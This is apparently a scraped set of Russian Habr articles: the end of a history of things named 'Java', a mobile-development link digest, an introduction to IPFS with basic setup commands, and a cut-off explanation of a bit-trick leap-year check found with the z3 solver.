В 19 веке те же голландцы дополнительно привезли кофе из Эфиопии. В середине 20 века фермеры обнаружили, что привезенный сорт оказался устойчив к болезни кофейной ягоды, которая еще в 1880-х уничтожила огромную часть урожая. Спустя 20 лет селекции, сформировался сорт кофе, который впоследствии назвали «Ява», по названию острова, где он был выведен. Сорт разъехался по разным плантациям, и в 2016 году впервые был официально признан Панамой как самостоятельный сорт кофе. С тех пор было выведено много производных сортов кофе, где исходным был именно сорт «Ява».
Характерный цвет молодых листьев деревьев Явы. © varieties.worldcoffeeresearch.org
При этом на острове Ява выращивают и другие сорта кофе. После гибели урожая в 1880-х, на остров завезли робусту и либерику. Да‑да, если вдруг кто не знал, то помимо арабики и робусты есть еще другие виды растений кофе (всего их более 120).
Вот небольшой список сортов, выращиваемых на Яве:
Malabar Coffee
Ciwidey Coffee
Palasari Coffee
Papandayan Coffee
Mount Puntang Coffee
Cikuray Coffee
Mount Halu Coffee
Samarang Arabica Coffee
Garut Java preanger
Temanggung Coffee
Muria Coffee
Wonosobo Coffee
Ambarawa Coffee
Banjarnegara Coffee
Java Ijen arabica Coffee
Arjuno Arabica Coffee
Bangelan Arabica Coffee
Javanese Coffee Arabica Coffee
Bromo Tengger Arabica Coffee
Jabung Arabica Coffee
Kawi Arabica Coffee
Таким образом, на острове Ява сформировалась ситуация, когда там выращиваются и сорта кофе «Ява» с производными сортами, так и завезенные сорта.
Ява — это сигареты
Для тех, кто старше, чем язык Java, сейчас будем сводить «олдскулы».
Тут должна быть другая фотография, но по закону оно выглядит так, мы за ЗОЖ и соблюдение закона.
История марки начинается в 1856 году, когда караимский купец Самуил Габай, основал в Москве табачную фабрику, которая тогда так и называлась «Товарищество Самуила Габая». Продукция фабрики была популярна, и дело успешно развивалось.
С 1912 года на фабрике начинают производить папиросы из табака, привезенного с Явы. Да, там помимо кофе еще хорошо растет табак и рис. Хотел сравнить ситуацию с выращиванием табака с событиями романа Жюля Верна «Таинственный остров», но нет, в романе действие происходит сильно южнее экватора и в Тихом океане, а не в Индийском.
Папиросы получили вполне очевидное название «Ява» и были очень популярны.
Делала фабрика и другие папиросы: «Герцеговина Флор», «Царские», «Леда», но «Ява» были популярнее, и благодаря этому, в 1920 году фабрику переименовывают, и она теперь называется «Фабрика Ява».
Фабрика работала и в Гражданскую войну, и в Великую Отечественную. Во время войны большая часть мощностей фабрики была эвакуирована в Чебоксары и Саратов.
В 1947 году на фабрике установили трофейные немецкие машины для резки табака и тогда же были выпущены первые сигареты с фильтром. Эта фабрика была известна еще и тем, что была передовым экспериментальным производством в своей области. Благодаря хорошим инвестициям и поддержке предприятие закономерно стало лучшим в стране по производству табачных изделий.
И вот тут я перейду к своим воспоминаниям. Сигареты «Ява» были очень популярны среди поколения моих родителей, хотя и были очень дорогими.
Интересным явлением был вопрос «Явская Ява?». Сигареты были столь популярными, что часть производства отдали на другие заводы в другие части страны и они, ожидаемо, были хуже качеством. Народ быстро смекнул, что к чему, поэтому о происхождении пачки старались узнавать до покупки.
Для меня, человека не курящего, этот вопрос, тем не менее, одно из интересных воспоминаний о детстве и подростковом возрасте.
Ява — это мотоцикл
Еще одно воспоминание из того периода — мотоцикл Jawa. Мы, понятное дело, называли этот мотоцикл «Ява».
Мотоцикл ""Ява"", © drive2.ru
Уже во время подготовки к написанию этой статьи я, пожалуй, впервые за последние 20 лет встретил на дороге такой мотоцикл. Я глазам своим не поверил!
Мотоцикл Jawa был дорогой, чехословацкого производства. Помимо того, что он был просто красивый, у него была еще одна особенность, сильно удивлявшая нас, мелких пацанов, бегавших вокруг:
Кикстартер Явы, © jawaczech
У этого мотоцикла кикстартер (в просторечии «дрыгалка») была совмещена с переключением передач. Ни на каких других мотоциклах я такого не видел.
Некоторые мотоциклы этой марки назывались «Чезет», я только недавно узнал, что это было народное прочтение названия модели: Jawa‑CZ 125 и Jawa‑CZ 150.
Долгое время эти мотоциклы продавались в основном в СССР, было продано 1.5 млн штук. Есть даже песня группы «Сектор газа», посвященная этому мотоциклу. Кстати, вы знали, что группа носит свое название по неформальному наименованию района Левобережного района Воронежа?
Эти мотоциклы производятся до сих пор, топовая модель выглядит так:
RVM 500 by JAWA Adventure, © jawa.eu
К острову Ява эти мотоциклы не имеют, к сожалению, никакого отношения. Это акроним, составленный из первых букв фамилии основателя Франтишека Янечека (чеш. František Janeček) и от названия фирмы «Вандерер» (Wanderer), у которой он купил технологию и лицензию на производство первых мотоциклов «Ява».
Ява — это язык программирования
Наконец, язык программирования тоже называется Java.
Создал его Джеймс Гослинг с коллегами в 1995 году, хотя работы начались в 1990-м году с разработки карманного компьютера Star7, который был прообразом технологии «умного дома» и, опередив свое время, не нашел коммерческого применения.
Джеймс Гослинг, © facesofopensource.com
Джеймс Гослинг к моменту начала работы над языком был знаком с работами Никлауса Вирта, в частности он портировал компилятор Pascal на Multics.
Гослинг приезжал в командировку к Вирту, был знаком с работами по Project Oberon, в рамках которого Вирт создал компьютер, язык программирования и операционную систему, на нем написанную. При этом, язык Оберон был со сборщиком мусора. Не буду утверждать, что Гослинг напрямую использовал работу Вирта, но пересечение идей очевидное. Да и первоначальное название языка Java — Oak, отсылает не только к дубу за окном офиса Гослинга, но и к документу Oakwood Guidelines, набору рекомендаций для разработчиков компиляторов языка Oberon-2.
Я не буду пересказывать историю языка, она достойна отдельного поста, упомяну лишь то, что язык мог называться и по‑другому. Дело в том, что название Oak уже было зарегистрировано, поэтому могли возникнуть юридические проблемы. Руководство Sun Microsystems предложило подумать над названием. Результатом мозгового штурма стал такой список:
Silk
DNA
Lyric
Pepper
NetProsse
Neon
Ruby
WebRunner Language
WebDancer
WebSpinner
Java
Собственно, последнее название, закрепившееся за языком, было собирательным названием кофе. Это не конкретно сорт кофе или какая‑то марка. В Америке 90-х весь кофе так или иначе назывался Java. Отсюда и чашка кофе на логотипе Java.
Заключение
Java — не единственный язык программирования, название которого является производным от острова. Другой такой язык — Котлин, названный в честь острова Котлин, на котором расположен город Кронштадт, что находится недалеко от Санкт‑Петербурга.
Остров Котлин, © spbkater.ru
История названия оказалась очень интересной и богатой. Как и сам язык, который, по прошествии 30 лет чувствует себя весьма уверенно и занимает прочные позиции в инструментарии разработчиков программного обеспечения.
Хочу поздравить всех причастных: своих коллег, кто все эти годы занимается развитием JVM и языка, и всех тех, кто языком пользуется.
Очень надеюсь, что следующие 30 лет будут не менее продуктивными.
P. S. В комментариях жду шутки про Омск.
P.P. S. Возможно, есть еще языки программирования, названные в честь острова. Если знаете, подскажите в комментариях, буду признателен."
Мобильная разработка за неделю #586 (12 — 18 мая),https://habr.com/ru/articles/910376/,"Новый большой дайджест после праздничного перерыва — архитектурный линтинг и Material 3 Expressive, тёмные уголки обфускации и Compose Multiplatform для iOS, типобезопасная передача результатов, слома...","Новый большой дайджест после праздничного перерыва — архитектурный линтинг и Material 3 Expressive, тёмные уголки обфускации и Compose Multiplatform для iOS, типобезопасная передача результатов, сломанные OTP и открытые конечные точки, UI-дизайн с ChatGPT и многое другое. Заходите!



Подписывайтесь на мой Telegram-канал Mobile Insights, где еще больше материалов для мобильных разработчиков.

iOS

• Архитектурный линтинг для Swift: часть 4
• Используем Core Motion в SwiftUI-приложении
• XCUITest для начинающих: как сделать тестирование iOS красивым с Allure
• GPT, DeepSeek и Qwen: идеальные unit-тесты в эхо-камере
• Новые функции доступности Apple для iPhone, iPad, Mac и Apple Vision Pro
• Учим Metal и image processing лишь бы не верстать на iOS
• Race Condition: проблема гонки потоков — что это и как избежать?
• Под капотом iOS-крешей
• TextField с автодополнением
• SwiftUI-навигация: просто, нативно и декларативно
• Удивительный мир внутри .ipa
• Core Motion framework в финансовых приложениях
• Scheduling notifications with time, calendar, and location triggers in iOS
• Adding dependencies to binary Swift packages
• Concurrency-Safe Testing in Swift 6.1 with @TaskLocal and Test Scoping
• Knowing when the battle is lost with XCUITests
• Demystifying Picture in Picture on iOS
• SwiftUI View Model Ownership
• Regular Expressions in Swift
• Formatting data inside SwiftUI Text views
• Vibe Xcoding your apps
• Optimized mathematical computations in Swift
• Customizing an App Intent
• SwiftUI Picker With Optional Selection
• Debug crashes in iOS using MetricKit
• Synthesizing text into speech
• Demystifying SwiftUI’s .ignoredByLayout()
• Default isolation with Swift 6.2
• The Power of KeyPath in SwiftUI
• Matrix3D: Large Photogrammetry Model
• Using ScrollViewReader for Programmatic Scrolling in SwiftUI: A Tutorial
• Change a map viewpoint with MapKit
• Ultimate Guide to Dependency Injection for Modular iOS app
• Create a Simple Theming Architecture with SwiftUI
• Resizable ScrollView Header | Scroll To Hide Header — SwiftUI
• SwiftUI Theme Switcher in 3 Minutes – Light & Dark Mode Made Easy
• Building emoji reactions in 5 minutes with SwiftUI
• Customized Paywall using Native SwiftUI StoreKit APIs
• Apple Engineer Shows How To Build a SwiftUI Sleep Tracker
• 3 Ways to Initialize @State in SwiftUI
• Apple’s Widget Backdoor
• SwiftOpenAI — пакет Swift для взаимодействия с публичным API OpenAI
• ProgressUI — кастомизируемые и анимированные индикаторы прогресса для SwiftUI
• Prefire — библиотека тестирования на основе Xcode Preview

Android

• Руководство по потреблению памяти Android Studio
• Типобезопасная передача результатов между экранами в Compose с Jetpack Navigation
• Google анонсирует дизайн Material 3 Expressive
• Мастерство фокусов на Compose (часть 2): как работает запрос фокуса
• Прячем код по-настоящему: тёмные уголки обфускации R8 и ProGuard
• ML KIT — Современное решение для сканирования в Android приложениях
• Jetpack Compose 1.8 уже здесь — и он меняет правила игры
• Подготовьте свои Android-приложения для страницы памяти в 16 КБ
• Тестирование Compose по-новому: простота, надежность, гибкость
• Путешествие к центру Композиции
• Scout: новый фреймворк для ускоренного и безболезненного управления зависимостями
• Компиляторные плагины: модификация и анализ Сompose
• Как я code coverage внедрял да Gradle plugin для baseline писал
• Stale Data & Leaks were killing my Kotlin apps for 5 years. Here’s the fix.
• Does Junie Create Accessible Android Apps?
• Simpler Gradle plugin loading
• Blazing fast app uninstalls for lazy Android Devs
• Kotlin’s Builder Functions: A Better Way to Create Lists, Maps, Strings & Sets
• Building delightful Android camera and media experiences
• Fast Feedback: Winning Back 60% of Our CI Time
• Effective Strategies for Testing Asynchronous Kotlin Code
• Compose UI Performance Secrets (Part 1): 5 Core Optimizations Every Developer Should Know
• Compose UI Performance Secrets (Part 2): 5 Advanced Techniques for Ultra-Smooth Apps
• Using movableContentOf for shared transitions in Jetpack Compose
• How to Use Firebase Remote Config in Server: Dynamic Control and AI Parameter Management
• Securing Android: Behind a few seconds of payment transaction …
• Why is Modern Android Development So Hard?
• How to Run Local LLM (AI) in Android Studio
• Avoid using Array in the data class constructor in Kotlin
• Modern Android App Architecture with Clean Code Principles (2025 Edition)
• Start building with Material 3 Expressive
• Imperative vs Declarative in Android — The Real Difference
• Tooltips in Compose Material 3
• Builder & Factory patterns in Kotlin — A Walk-Through Object
• The navigation drawer is being deprecated in the Material 3 expressive update
• The Android Show: I/O Edition
• Now in Android: 116 – Google I/O, Gemini, and Jetpack Compose 1.8
• What’s new in Android Studio Meerkat Feature Drop
• Android Testing Strategies
• Tools and patterns for scalable Android app testing
• 5 Anti-Patterns With Coroutines & Flows You MUST Avoid!
• How Kotlin is Powering TV Broadcasts Worldwide
• Android & Kotlin Development Masterclass – Full Course
• Build your App from Scratch without Material 3 Color System
• Compose Unstyled — набор дизайн-компонентов Compose
• Haze — размытие глассморфизма для Compose
• Night Clock — минималистичные часы для Android

Кроссплатформа

• Compose Multiplatform для iOS стабилен и ждет ваших приложений
• Когда JavaScript недостаточно: Практика разработки нативных модулей для React Native
• Kotlin Multiplatform vs Compose Multiplatform: отличия, способы создания и как запустить на iOS
• Готов ли Compose iOS к продакшену?
• Implementing DataStore in Kotlin Multiplatform Projects
• I use this clean architecture setup for all my Flutter projects — finally made it public
• Flutter Tips
• Flutter Isolates: Multithreading Made Easy in Dart
• 5 React Native Truths I Wish I Knew Before Building 10+ Apps
• The Ultimate Guide to Flutter’s Most Useful Packages
• Kotlin Multiplatform: Have your code and eat it too
• MCP Explained for Flutter Developers: Everything You Should Know

Разработка

• Как сломанные OTP и открытые конечные точки могут превратить приложение для знакомств в кошмар
• UI-дизайн с ChatGPT 4o
• Left Shift Testing: как выстроить процесс, чтобы тесты реально помогали
• Как мы в YouGile сделали голосовые круче, чем Telegram. Их полюбят даже хейтеры
• Идеальный процесс взаимодействия аналитика и мобильного разработчика
• Первый проект на HarmonyOS — мой плейлист для старта с нуля
• История одного редизайна. Экран карты в мобильном приложении ОТП Банка
• Погружаемся в пуши. Создаём свою альтернативу сервисам рассылки Push
• Разработчик HarmonyOS Next про ArkTS и HarmonyOS
• Язык программирования Groovy: JVM языки, Java, Kotlin, Gradle, DSL
• Как работают нейроинтерфейсы: киборги, Neuralink, brain-computer interface
• Figma выпускает новые инструменты с искусственным интеллектом для создания сайтов, прототипов приложений и маркетинговых ресурсов
• Learning to Think in an AI World: 5 Lessons for Novice Programmers
• Dumb Leadership Mistakes I’ve Made
• Write the most clever code you possibly can
• When SOLID breaks: Choose CLARITY
• Good vs Great Animations
• Duolingo Just Ended The Term “UX Design”
• Design Messenger — Mobile System Design Mock Interview
• C++ Course: Build an Audio Plugin

Аналитика, маркетинг и монетизация

• Сравнение конверсий IAP и веб платежей в iOS-приложении
• Приложения для знакомств сделали лучший месяц по доходам за всю историю
• В новом приложении Airbnb все, что нужно для отдыха, в одном месте
• Duolingo заменяет сердечки энергией
• Эмулятор Delta сделал Patreon главной системой монетизации в App Store
• Самые скачиваемые и зарабатывающие приложения в России в апреле 2025
• Самые скачиваемые и зарабатывающие приложения в мире в апреле 2025
• Epic Games одержала крупную победу и Apple было предписано выполнить судебное решение по App Store
• Стоит ли разработчикам iOS-приложений переходить на веб-платежи?
• Ask HN: How are you acquiring your first hundred users?

AI, Устройства, IoT

• Как найти и потерять бэкдор в ESP32
• Что убивает ваши IoT-проекты — и как Edge это исправит
• Как декомпозиция повышает точность распознавания текста: опыт с фотографиями СТС
• Галлюцинации моделей текстовых ИИ, и как с ними бороться
• Windsurf выпустил свои ИИ-модели для программной инженерии
• Stability AI выпустила модель генерации звука, которая может работать на смартфонах
• OpenAI хочет создать ОС всей жизни на основе ИИ
• Apple выпустила новый визуальный энкодер FastVLM
• LegoGPT — ИИ-модель для сборки моделей Lego

← Предыдущий дайджест. Если у вас есть другие интересные материалы или вы нашли ошибку — пришлите, пожалуйста, в почту."
"IPFS вместо HTTP: нужен ли нам новый интернет, если старый ещё работает?",https://habr.com/ru/articles/910362/,"Сегодня мы заходим на сайты, пользуемся приложениями, скачиваем данные — всё это через протокол HTTP. Он стал стандартом более 30 лет назад и до сих пор остаётся основой Всемирной паутины. Но он не ид...","Сегодня мы заходим на сайты, пользуемся приложениями, скачиваем данные — всё это через протокол HTTP. Он стал стандартом более 30 лет назад и до сих пор остаётся основой Всемирной паутины. Но он не идеален. Централизация, уязвимости к цензуре, проблемы масштабируемости подталкивают разработчиков к поиску альтернатив. Одной из самых известных идей стала технология IPFS. Эта идея обещает создать новый, децентрализованный интернет, где информация будет жить дольше, быть доступнее и устойчивее. Но непонятно, готовы ли мы к такому переходу? И действительно ли IPFS может заменить HTTP?
Источник изображения: hdhai.com
Что такое IPFS и как он работает
Кратко напомним. IPFS (InterPlanetary File System) — это протокол и система хранения данных, ориентированная на создание децентрализованной сети. Его главная идея — отказаться от традиционной модели клиент-сервер, где файлы хранятся на одном сервере, и перейти к распределённому хранению информации по всему миру.
Вместо того, чтобы запрашивать данные по адресу сервера (как в HTTP), IPFS использует адресацию по содержимому. То есть, каждый файл получает уникальный хеш, своего рода цифровой отпечаток. Чтобы получить файл, вы просто указываете его хеш, и система ищет его у ближайших пиров, а не на удалённом сервере.
Такая модель получения данных делает их неизменными (файл нельзя изменить без изменения его хеша), устойчивыми к потере (хранится сразу у многих пользователей) и более быстрыми для загрузки — нет так называемой воронки.

Почему HTTP, можно сказать, не очень справляется?
HTTP был создан ещё в 1991 году и за прошедшие десятилетия стал основой современного интернета. Однако у него есть серьёзные ограничения в виде: централизация, дублирование трафика, проблемы с долгосрочным хранением и зависимость от DNS.Подрробнее:
Централизация
Большинство сайтов находятся на серверах крупных провайдеров или CDN. Это создаёт точки отказа и позволяет блокировать контент.

Дублирование трафика
Если тысячи людей одновременно скачивают один и тот же файл с сервера, нагрузка на него возрастает (сильно!).

Проблемы с долгосрочным хранением
Сайт может исчезнуть, если закончился домен или сервер выключен.

Зависимость от DNS
Если домен заблокирован или удалён, доступ к сайту теряется, даже если сам контент существует.
Вот и получается, что все эти проблемы становятся особенно актуальными с ростом числа пользователей, увеличением объёмов данных и развитием цифровой экономики. Именно поэтому появляются новые подходы к организации сетей, в том числе такие, как IPFS.

Как устроен IPFS (базовые принципы)
Чтобы понять, как работает IPFS, достаточно представить, как вы ищете книгу в библиотеке. В HTTP вы идёте к определённой полке, где она должна быть. Если её там нет — вы нифига ничего не найдёте. В IPFS же вы говорите: «У меня есть хеш этой книги, кто-нибудь знает, где она?» — и любой, у кого она есть, может помочь.

Напомним основные элементы IPFS
Контент-адресация
Файлы идентифицируются по их содержимому, а не по местоположению.

DHT (распределённая хеш-таблица)
Помогает находить, где именно находится нужный файл.

Merkle DAG
Данные организуются в древовидную структуру, где каждый узел связан с другими. Это обеспечивает целостность и безопасность.

Гипермедиа
Аналогично веб-ссылкам, но теперь они работают внутри децентрализованной сети.
То есть, всё это делает IPFS мощной платформой для хранения и обмена данными без единой точки контроля!

Где-то уже используется IPFS?
Несмотря на то, что IPFS пока не стал массовым стандартом, он уже кое-где, конечно, применяется. В частности, в NFT и блокчейне, децентрализованных соцсетях (ага, есть такие), в хранении важных документов, в браузерах и в университетах. Также существуют сервисы вроде Pinata, Infura, nft.storage, которые позволяют пользователям удобно работать с IPFS без глубокого технического понимания.

NFT и блокчейн: многие NFT используют IPFS для хранения медиафайлов, потому что он обеспечивает постоянное хранение и прозрачность.

Децентрализованные соцсети: проекты вроде Mastodon, Scuttlebutt и других используют IPFS для создания независимых от корпораций сетей.

Хранение важных документов: например, правительства и НКО архивируют информацию в IPFS, чтобы защитить её от цензуры.

Интеграция в браузеры: Opera, Brave и другие поддерживают работу с IPFS через шлюзы (gateways).

Образование и наука: университеты и исследовательские институты используют IPFS для хранения и обмена большими массивами данных.

А почему IPFS ещё не заменил HTTP?
Ну, как и любая новая технология, IPFS сталкивается с разными сложностями. Например, нет гарантий доступности. Это когда никто не пиннит ваш файл, он может исчезнуть из сети. Далее идёт сложность использования, когда для обычного пользователя работа с IPFS требует дополнительных знаний и инструментов. Отсутствует экономическая модель, когда в отличие от облачных хранилищ, где вы платите за место, или в IPFS непонятен механизм, который бы стимулировал людей хранить чужие данные. Да и медленное принятие технологии в принципе: большинство сайтов, сервисов и пользователей всё ещё используют HTTP. И конечно же юридические вопросы — как бороться с нелегальным контентом в полностью децентрализованной системе?
Именно поэтому IPFS пока не вытеснил HTTP, но всё же активно развивается, особенно в сочетании с криптовалютой Filecoin, которая предлагает экономическую модель для хранения данных.

Как будет выглядеть будущий IPFS?
Так как развитие IPFS — это часть более широкого движения, которое часто называют Web3, оно предполагает, что пользователи будут контролировать свои данные, использовать децентрализованные сервисы и участвовать в управлении сетью через DAO (децентрализованные автономные организации). Поэтому можно представить себе интернет, в котором:
Каждый человек имеет свой собственный персональный ""узел"".
Сайты живут всегда, потому что хранятся у всех, кто ими пользуется.
Социальные сети не зависят от одной хостинговой компании.
Данные невозможно удалить или заблокировать.
Такой интернет мог бы быть более справедливым, безопасным и устойчивым. А IPFS — это один из первых шагов в этом направлении.
Если вы хотите попробовать IPFS, сделать это можно несколькими способами. Скачать с официального сайта и установить IPFS Desktop (графическая версия для Windows/macOS/Linux). Запустить (программа создаст локальный IPFS-узел). Добавить файлы через кнопку «+ Add» (они появятся в вашей локальной сети). А далее поделиться ссылкой вида: https://ipfs.io/ipfs/<ваш_CID>. Теперь, если ваш узел выключен, файл будет доступен, но только если его закешировали другие.

Если предпочитаете терминал

Установим IPFS:
#Linux/macOS (через brew)
#Или скачаем бинарник с https://dist.ipfs.tech/#kubo
brew install ipfs
Инициализируем узел:
ipfs init
Запустим демон:
ipfs daemon
Теперь узел должен работает на http://localhost:5001
Добавим файл в сеть:
ipfs add myfile.txt
И получим CID (например, QmXoyeizjW3WjnFiJnKrwHCnL72vedxjQkD4P1mXWo6uco).
Откроем файл через браузер:
http://localhost:8080/ipfs/
Или через публичный шлюз:
https://ipfs.io/ipfs/
Но можно выбрать для хранения файлов или сайтов облачные сервисы, которые упрощают работу с IPFS, избавляя от необходимости запускать свой узел (ipfs daemon) или держать компьютер включённым 24/7. Например, хорошо известные на сегодня Pinata (бесплатное хранилище до 1 ГБ), Infura и nft.storage, который с июня 2024 стал платным.
По факту, IPFS не требует глубоких технических знаний, и чем больше людей начнут его использовать, тем быстрее он станет частью повседневного интернета. Хотя он пока не заменил старый протокол, он уже сейчас решает многие задачи, с которыми не справляется современный интернет. Очевидно, что IPFS не убьёт HTTP в ближайшие годы, но станет важной частью альтернативного интернета, особенно, где важна анонимность. Не исключено, что через несколько лет мы будем удивляться, как вообще раньше обходились без IPFS. Правда, последнюю фразу, где-то и когда-то лично я уже слышала. Однако по большому счёту воз и ныне там. Но ведь и к ИИ особо никто не был готов..."
Проверка високосности года в трёх командах CPU,https://habr.com/ru/articles/910188/,"Показанным ниже кодом вы можете проверить на високосность год в интервале 0 ≤ y ≤ 102499 всего примерно тремя командами CPU:
bool is_leap_year_fast(uint32_t y) {
    return ((y * 1073750999) & 3221352...","Показанным ниже кодом вы можете проверить на високосность год в интервале 0 ≤ y ≤ 102499 всего примерно тремя командами CPU:
bool is_leap_year_fast(uint32_t y) {
    return ((y * 1073750999) & 3221352463) <= 126976;
}
Как это работает? Ответ на удивление сложен. В статье я объясню процесс; в основном он связан с забавным битовым жонглированием. В конце мы обсудим применение этого кода на практике.
Вот, как обычно реализуется проверка на високосность:
bool is_leap_year(uint32_t y) {
    if ((y % 4) != 0) return false;
    if ((y % 100) != 0) return true;
    if ((y % 400) == 0) return true;
    return false;
}
Мы пользуемся пролептическим григорианским календарём, расширяющим григорианский календарь с момента начала его использования в 1582 году до нулевого года. Благодаря этому нам не нужно как-то по-другому обрабатывать даты до 1582 года. Для простоты мы не будем учитывать отрицательные года и используем беззнаковые величины.
Оптимизируем стандартное решение
Для начала реализуем простые трюки для ускорения, чтобы получить точку отсчёта. Я не знаю, кто конкретно их придумал — вероятно, эти трюки многократно изобретались заново.
Можно заменить (y % 100) != 0 на (y % 25) != 0: мы уже знаем, что y кратен 22, поэтому если он кратен 52, то кратен и 22 ⋅ 52 = 100. Аналогично, мы можем заменить (y % 400) == 0 на (y % 16) == 0: мы уже знаем, что y кратен 52, поэтому если он также кратен 24, то кратен и 52 ⋅ 24 = 400.
bool is_leap_year1(uint32_t y) {
    if ((y % 4) != 0) return false;
    if ((y % 25) != 0) return true;
    if ((y % 16) == 0) return true;
    return false;
}
Это полезно, потому что теперь мы можем заменить деление с остатком на 4 и 16 побитовым маскированием. Есть и ещё один трюк, хорошо известный разработчикам компиляторов, позволяющий избавиться от деления с остатком на 25. Скомпилировав (x % 25) != 0 при помощи gcc и выполнив трансляцию обратно на C, мы получим x * 3264175145 > 171798691. Так как умножение обычно имеет задержку 3 такта, а деление с остатком — не менее 20 тактов, это солидное улучшение. Я объясню в общих чертах, как это работает; подробности можно найти в
В статье Faster remainder by direct computation: Applications to compilers and software libraries Дэниела Лемайра, Оуэна Кейсера и Натана Курца про уменьшение на константу делителя при делении с остатком;
В Euclidean affine functions and their application to calendar algorithms Кассио Нери и Лоренца Шнайдера про календарные вычисления
В Identifying leap years Дэвида Тёрнера о проверке високосности (в том числе с формальными доказательствами!).
Откуда берутся эти магические числа? У нас есть
232 ⋅ 19/25 = 3264175144,96 (ровно).
То есть умножив на 3264175145, мы приблизительно вычисляем дробную часть умножения на (19/25). Если это было точное умножение, мы получим для кратных 25 чисел дробную часть, равную нулю. Однако если мы умножим на число, которое больше на 0,04, то погрешность может быть до 0,04 ⋅ (232 - 1) = 171798691,8; отсюда и берётся второе магическое число.
Этот трюк не так хорошо работает для x % 100, где нам нужна ещё одна fixup-команда, так что уменьшение с y % 100 до y % 25 было очень полезным.
Теперь наша проверка на високосность выглядит так:
bool is_leap_year2(uint32_t y) {
    if ((y & 3) != 0) return false;
    if (y * 3264175145u > 171798691u) return true;
    if ((y & 15) == 0) return true;
    return false;
}
Стоит отметить, что современные компиляторы наподобие gcc и clang создают из is_leap_year1 что-то наподобие is_leap_year2, так что делать это в исходниках на C нет особого смысла, но в других языках это может оказаться полезным.
Обычно такой код компилируется в ассемблерный код с ветвлением. На практике, вводимые данные обычно достаточно предсказуемы, поэтому это необязательно плохо. Если мы хотим избежать снижения производительности из-за ошибок прогнозирования ветвления, то ценой замедления наилучшего случая можем немного изменить структуру и получить код без ветвления (и одновременно хорошего кандидата для соревнований в гольф-кодинге):
bool is_leap_year3(uint32_t y) {
    return !(y & ((y % 25) ? 3 : 15));
}
Если вы хотите узнать о других способах ускорения календарных вычислений, то изучите Optimizing with Novel Calendrical Algorithms Джейкоба Пратта.
Находим решение с битовым жонглированием
Можно ли усовершенствовать вычисление високосности, отказавшись от корректности всех входных данных? В конце концов, обычно нас не волнует, будет ли високосным 3584536493 год; и в самом деле, Python, C# и Go поддерживают года с 0 (или 1) до 9999 (в котором смещение относительно времён года уже будет больше четырёх дней). Я подумал, что если существует более короткое решение, то оно бы выглядело как какое-то странное хэширование с магическими константами, поэтому решил попробовать малые формы и подобрать константы перебором. Вид (y * f) <= t кажется полезным, но пока недостаточно мощным. Одним из моих кандидатов стало добавление маски: ((y * f) & m) <= t. Теперь у нас есть для угадывания 96 бита, одним лишь брутфорсом это не решить. Давайте воспользуемся z3 — солвером, поддерживающим ограничения битовых векторов, что идеально нам подходит:
import z3

BITS = 32
f, m, t, y = z3.BitVecs('f m t y', BITS)

def target(y):
    return z3.And((y & 3) == 0, z3.Or(z3.URem(y, 25) != 0, (y & 15) == 0))

def candidate(x):
    return z3.ULE((x * f) & m, t)

solver = z3.Solver()
solver.add(z3.ForAll(y, z3.Implies(z3.ULE(y, 400),
                                   candidate(y) == target(y))))

if solver.check() == z3.sat:
    print(f'found solution: {solver.model()}')
else:
    print('no solution found')
За несколько секунд он обнаружил константы, позволяющие получать корректный результат для нетривиального интервала значений годов. Расширяя этот интервал, я в конечном итоге примерно за полчаса вычислений обнаружил константы, дающие корректный результат с года 0 по год 102499, и доказал, что для 32 битов это оптимум:
bool is_leap_year_fast(uint32_t y) {
    const uint32_t f = 1073750999u;
    const uint32_t m = 3221352463u;
    const uint32_t t = 126976u;
    return ((y * f) & m) <= t;
}
Объяснение
Как это работает? Кажется неожиданным, почти волшебным, что мы можем уместить все эти вычисления всего в три команды. Однако описанное выше даёт нам основные инструменты для понимания этого.
Вот наши константы в двоичном виде; четыре релевантных интервала битов обозначены буквами:
Давайте сначала разберёмся, что делает маскирование при помощи m и сравнение с t для произведения p := y ⋅ f. В блоке A, биты t равны 0, а значит, если какой-то из битов в A ненулевой в p, результатом будет false. В противном случае релевантным становится блок B. Здесь все биты в t равны 1, поэтому результат равен true, если какой-то из битов B имеет в p ненулевое значение. В противном случае для блока C мы требуем, чтобы все биты в p были нулевыми. Благодаря этому куча сравнений интервалов битов объединена в единственный <=.
То есть мы можем переписать is_leap_year_fast следующим образом:
bool is_leap_year_fast2(uint32_t y) {
    uint32_t p = y * 1073750999u;
    const uint32_t A = 0b11000000000000000000000000000000;
    const uint32_t B = 0b00000000000000011111000000000000;
    const uint32_t C = 0b00000000000000000000000000001111;
    if ((p & A) != 0) return false;
    if ((p & B) != B) return true;
    if ((p & C) == 0) return true;
    return false;
}
Это подозрительно похоже на is_leap_year2! И в самом деле, три условия имеют точно такое же предназначение. Мы покажем, что
(p & A) != 0 срабатывает, когда (y % 4) != 0;
(p & B) != B срабатывает, когда (y % 100) != 0;
(p & C) == 0 срабатывает, когда (y % 16) == 0 (и, следовательно, (y % 400) == 0, потому что мы уже знаем, что y кратно 25).
Два простых случая: (1) и (3)
(1): Бит 1 блока A в f воссоздаёт два младших бита y в p в блоке A. Их нельзя спутать с результатом умножения на биты в D: максимальное значение, которое мы можем получить — это 102499 ⋅ (f & D) = 940428325, состоящее всего из 30 битов. Таким образом, проверка A на нулевое значение в p эквивалентно проверке, равен ли нулю остаток от деления y на 4.
(3): Проверка того, что ни один из младших 4 битов не задан в p — это проверка того, равен ли нулю остаток от деления p на 16. Однако на самом деле мы хотим проверить y. Это не проблема: достаточно взглянуть только на младшие 4 бита f, а f здесь 11112 = 15. Умножение на 15 = 3 ⋅ 5 не добавляет нового делителя 2, поэтому состояние делимости на 16 не меняется.
Любопытный случай: (2)
Теперь давайте попробуем выяснить, для каких чисел p & B ≠ B. Для этого бит 1 в f & A не играет роли, поэтому рассмотрим биты в f & D. Они равны 100011110101112 = 9175. Давайте проверим, какие числа пройдут тест.
>>> B = 0b00000000000000011111000000000000
>>> s = [y for y in range(5000) if ((y * 9175) & B) == B]
>>> for i in range(0, len(s), 16): print(*(f'{n:4d}' for n in s[i:i+16]))
  14   57   71  100  114  157  171  200  214  257  271  300  314  357  371  400
 414  457  471  500  514  557  571  600  614  657  671  700  714  757  771  800
 814  857  871  900  914  957  971 1000 1014 1057 1071 1100 1114 1157 1171 1200
1214 1257 1271 1300 1314 1357 1371 1400 1414 1457 1471 1500 1514 1557 1571 1600
1614 1657 1671 1700 1714 1757 1771 1800 1814 1857 1871 1900 1914 1957 1971 2000
2014 2057 2071 2100 2114 2157 2171 2200 2214 2257 2271 2300 2314 2357 2371 2400
2414 2457 2471 2500 2514 2557 2571 2600 2614 2657 2671 2700 2714 2757 2771 2800
